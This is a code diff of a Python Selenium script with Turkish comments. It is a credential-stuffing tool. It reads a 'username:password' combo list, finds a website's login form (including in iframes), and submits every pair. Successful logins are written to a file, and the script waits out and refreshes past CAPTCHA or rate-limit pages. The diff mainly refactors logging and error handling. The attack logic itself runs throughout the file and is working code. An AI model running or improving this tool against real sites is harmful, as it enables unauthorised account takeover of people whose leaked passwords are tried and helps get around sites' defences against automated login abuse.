@@ -17,6 +17,23 @@ except ImportError:
 
 init(autoreset=True)
 
+# --- Helper Print Functions ---
+def print_info(message):
+    print(f"{Style.BRIGHT}[+] {message}{Style.RESET_ALL}")
+
+def print_debug(message):
+    print(f"{Fore.CYAN}[DEBUG] {message}{Style.RESET_ALL}")
+
+def print_warning(message):
+    print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")
+
+def print_critical(message):
+    print(f"{Fore.RED}[CRITICAL] {message}{Style.RESET_ALL}")
+
+def print_success(message):
+    print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
+# --- End Helper Functions ---
+
 def set_input_value_and_trigger_events(driver, element, value):
     driver.execute_script("""
         var input = arguments[0], value = arguments[1];
@@ -28,7 +45,7 @@ def set_input_value_and_trigger_events(driver, element, value):
 
 def find_login_elements(driver):
     """iframe'leri de kontrol ederek login formunu ve inputları akıllıca bulur."""
-    print("DEBUG: Login elementleri aranıyor...")
+    print_debug("Login elementleri aranıyor...")
     wait = WebDriverWait(driver, 10)
     
     # Önce ana sayfada ara
@@ -45,32 +62,32 @@ def find_login_elements(driver):
             try:
                 user_input = form.find_element(By.CSS_SELECTOR, selector)
                 if user_input.is_displayed():
-                    print("DEBUG: Ana sayfada login elementleri bulundu.")
+                    print_debug("Ana sayfada login elementleri bulundu.")
                     return form, user_input, pass_input
             except NoSuchElementException:
                 continue
     except (TimeoutException, NoSuchElementException):
-        print("DEBUG: Ana sayfada form bulunamadı, iframe'ler kontrol ediliyor.")
+        print_debug("Ana sayfada form bulunamadı, iframe'ler kontrol ediliyor.")
 
     # iframe'lerde ara
     iframes = driver.find_elements(By.TAG_NAME, 'iframe')
     for frame in iframes:
         try:
             driver.switch_to.frame(frame)
-            print(f"DEBUG: iframe '{frame.get_attribute('id') or frame.get_attribute('name')}' içine girildi.")
+            print_debug(f"iframe '{frame.get_attribute('id') or frame.get_attribute('name')}' içine girildi.")
             form = wait.until(EC.presence_of_element_located((By.TAG_NAME, 'form')))
             pass_input = form.find_element(By.CSS_SELECTOR, "input[type='password']")
             for selector in user_input_selectors:
                 try:
                     user_input = form.find_element(By.CSS_SELECTOR, selector)
                     if user_input.is_displayed():
-                        print("DEBUG: iframe içinde login elementleri bulundu.")
+                        print_debug("iframe içinde login elementleri bulundu.")
                         return form, user_input, pass_input
                 except NoSuchElementException:
                     continue
             driver.switch_to.default_content() # Ana sayfaya geri dön
         except (TimeoutException, NoSuchElementException):
-            print("DEBUG: Bu iframe'de form bulunamadı.")
+            print_debug("Bu iframe'de form bulunamadı.")
             driver.switch_to.default_content()
             continue
             
@@ -78,7 +95,7 @@ def find_login_elements(driver):
 
 
 def initialize_driver(browser, headless):
-    print(f"DEBUG: Tarayıcı '{browser}' için ayarlar yapılıyor.")
+    print_debug(f"Tarayıcı '{browser}' için ayarlar yapılıyor.")
     if browser == 'chrome':
         from selenium.webdriver.chrome.options import Options as ChromeOptions
         options = ChromeOptions()
@@ -110,7 +127,7 @@ def get_args():
 
 def validate_url(url):
     if not url.startswith(('http://', 'https://')):
-        print(f"{Fore.YELLOW}[!] URL 'http://' veya 'https://' ile başlamalı. Otomatik olarak 'https://' ekleniyor.")
+        print_warning("URL 'http://' veya 'https://' ile başlamalı. Otomatik olarak 'https://' ekleniyor.")
         return 'https://' + url
     return url
 
@@ -119,28 +136,37 @@ def read_combos(file_path):
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             combos = [line.strip().split(':', 1) for line in f if ':' in line and len(line.strip().split(':', 1)) == 2]
         if not combos:
-            print(f"{Fore.RED}[!] Combo listesi boş veya geçersiz formatta (her satır 'kullanıcı:şifre' olmalı).")
+            print_critical("Combo listesi boş veya geçersiz formatta (her satır 'kullanıcı:şifre' olmalı).")
             sys.exit(1)
-        print(f"{Fore.GREEN}[+] {len(combos)} adet kombinasyon yüklendi.")
+        print_success(f"{len(combos)} adet kombinasyon yüklendi.")
         return combos
     except FileNotFoundError:
-        print(f"{Fore.RED}[!] Combo dosyası bulunamadı: {file_path}")
+        print_critical(f"Combo dosyası bulunamadı: {file_path}")
         sys.exit(1)
 
 def main():
     args = get_args()
-    url = validate_url(args.url)
+    url = validate_url(args.url.strip())
     combos = read_combos(args.combo)
     
     driver = None
+    pbar = None
     success_log = open("basarili_giris.txt", "a")
     
     try:
         driver = initialize_driver(args.browser, args.headless)
-        print(f"[+] '{url}' adresine gidiliyor...")
-        driver.get(url)
+        print_info(f"'{url}' adresine gidiliyor...")
+        try:
+            driver.get(url)
+            # Sayfa yüklendikten sonra 3 saniye bekle, dinamik içeriklerin yerleşmesi için
+            time.sleep(3) 
+        except WebDriverException as e:
+            print_critical(f"URL'e ulaşılamadı. Lütfen URL'yi ve internet bağlantınızı kontrol edin. Hata: {e.msg}")
+            return # finally bloğu çalışacak
+
         initial_url = driver.current_url
 
+        print_info("Giriş formu ve elemanları aranıyor...")
         form, user_input, pass_input = find_login_elements(driver)
         
         # Uzunluk Kurallarını Al ve Filtrele
@@ -156,16 +182,17 @@ def main():
         ]
         
         if len(combos) < original_combo_count:
-            print(f"{Fore.YELLOW}[!] Form uzunluk kurallarına uymayan {original_combo_count - len(combos)} kombinasyon elendi.")
+            print_warning(f"Form uzunluk kurallarına uymayan {original_combo_count - len(combos)} kombinasyon elendi.")
         
         if not combos:
-            print(f"{Fore.RED}[!] Filtreleme sonrası denenecek kombinasyon kalmadı.")
-            sys.exit(0)
+            print_critical("Filtreleme sonrası denenecek kombinasyon kalmadı.")
+            return
             
-        print(f"[+] {len(combos)} kombinasyon denenecek...")
-        pbar = tqdm(total=len(combos), desc="Denemeler", unit=" combo")
+        print_info(f"{len(combos)} kombinasyon denenecek...")
+        pbar = tqdm(total=len(combos), desc="Denemeler", unit=" combo", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]")
 
         for i, (username, password) in enumerate(combos):
+            current_url_before_submit = driver.current_url
             try:
                 # Her denemeden önce elementlerin "taze" olduğundan emin ol
                 if i > 0:
@@ -176,17 +203,18 @@ def main():
                 
                 form.submit()
                 
-                # Başarı kontrolü
-                WebDriverWait(driver, 3).until(lambda d: d.current_url != initial_url)
+                # Başarı kontrolü: URL'in değişmesini bekleyeceğiz.
+                # Bazen submit sonrası sayfa hemen değişmez, bu yüzden kısa bir bekleme ekliyoruz.
+                WebDriverWait(driver, 3).until(EC.url_changes(current_url_before_submit))
                 
-                print(f"\n{Fore.GREEN}[SUCCESS] Başarılı Giriş! Kullanıcı: {username} | Şifre: {password}")
+                print_success(f"\nBaşarılı Giriş! Kullanıcı: {username} | Şifre: {password}")
                 success_log.write(f"{username}:{password}\n")
                 
-                # Başarılı olunca devam etme veya durma seçimi kullanıcıya bırakılabilir. Şimdilik duruyor.
+                # Başarılı olunca döngüyü kır
                 break
 
             except TimeoutException:
-                # Giriş başarısız oldu, devam et
+                # Giriş başarısız oldu (URL değişmedi), devam et
                 pbar.update(1)
                 pbar.set_postfix_str(f"Denendi: {username}:{password} -> Başarısız")
                 
@@ -194,27 +222,28 @@ def main():
                 if (i + 1) % args.rate_limit_tries == 0:
                     page_source = driver.page_source.lower()
                     if "captcha" in page_source or "too many requests" in page_source or "rate limit" in page_source:
-                        print(f"\n{Fore.YELLOW}[!] Olası rate-limit/CAPTCHA tespit edildi. {args.rate_limit_wait} saniye bekleniyor...")
+                        print_warning(f"\nOlası rate-limit/CAPTCHA tespit edildi. {args.rate_limit_wait} saniye bekleniyor...")
                         time.sleep(args.rate_limit_wait)
                         driver.refresh() # Sayfayı yenileyerek CAPTCHA'dan kurtulmayı dene
             
             except (NoSuchElementException, WebDriverException) as e:
-                print(f"\n{Fore.RED}[!] Form elemanı bulunamadı veya sayfa değişti. Yeniden deneniyor... Hata: {e}")
+                print_warning(f"\nForm elemanı bulunamadı veya sayfa değişti. Sayfa yenileniyor... Hata: {e}")
                 driver.get(url) # Sayfayı yeniden yükle
                 continue # Bu kombinasyonu atla ve sonraki ile devam et
 
-    except NoSuchElementException as e:
-        print(f"\n{Fore.RED}KRİTİK HATA: Login elemanları bulunamadı. Lütfen sitenin yapısını kontrol edin. Hata: {e}")
-    except WebDriverException as e:
-        print(f"\n{Fore.RED}KRİTİK HATA: WebDriver ile bir sorun oluştu. Tarayıcı veya sürücü versiyonlarını kontrol edin. Hata: {e}")
-    except Exception as e:
-        print(f"\n{Fore.RED}KRİTİK HATA: Beklenmedik bir hata oluştu: {e}")
+    except (WebDriverException, NoSuchElementException, TimeoutException) as e:
+        print_critical(f"Ana programda bir sorun oluştu: {e}")
+    except KeyboardInterrupt:
+        print_warning("\nKullanıcı tarafından işlem iptal edildi.")
     finally:
+        if pbar:
+            pbar.close()
         if driver:
+            print_info("Tarayıcı kapatılıyor.")
             driver.quit()
-        success_log.close()
-        pbar.close()
-        print("\n[+] Tarama tamamlandı.")
+        if success_log:
+            success_log.close()
+        print_info("Tarama tamamlandı.")
 
 if __name__ == "__main__":
     main()
